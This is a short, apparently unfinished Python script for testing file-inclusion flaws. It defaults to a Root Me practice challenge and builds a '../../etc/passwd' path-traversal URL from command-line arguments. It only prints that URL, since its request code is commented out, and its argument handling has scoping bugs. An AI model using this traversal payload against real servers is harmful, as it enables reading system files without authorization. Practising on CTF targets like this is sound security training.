import argparse
import requests
import sys

mode='lfi'
url='http://challenge01.root-me.org/web-serveur/ch13'
url_param='?lang='
url_payload='../../'
target_file='etc/passwd'




# res = requests.get(target_uri)

# if res.status_code == 200 :
#     print(res.text)
# else :
#     print("the request get status code :", res.status_code)


def command_parse ():
    parser = argparse.ArgumentParser(description='This tool if used for test lfi/rfi vulnerabilities on web server. app.py --mode lfi --url http://target.com --pm=?lang= --tf=.passwd')
    parser.add_argument('-m', '--mode', help='mode of attack (lfi or rfi) the default mode is lfi')
    parser.add_argument('-u', '--url', help='target url')
    parser.add_argument('-p', '--pm', help='vulnerable param on url')
    parser.add_argument('-t', '--tf', help='target file on server, default file is /etc/passwd')
    args = parser.parse_args()
    if args.mode:
        mode = args.mode
    else :
        args.mode = 'lfi'
    if args.url:
        url = args.url
    else:
        print("Command error: url is not provided")
    if args.pm:
        param = args.pm
    else:
        print("Command error: param is not provided")
    if args.tf:
        target_file = args.tf
    else:
        print("Command error: target file is not provided")
    return [args.mode, args.url, args.pm, args.tf]

cmd = command_parse()

if(cmd[0]=='lfi'):
    lfi_target_uri="{}{}{}{}".format(cmd[1], cmd[2],url_payload, cmd[3])
    print(lfi_target_uri)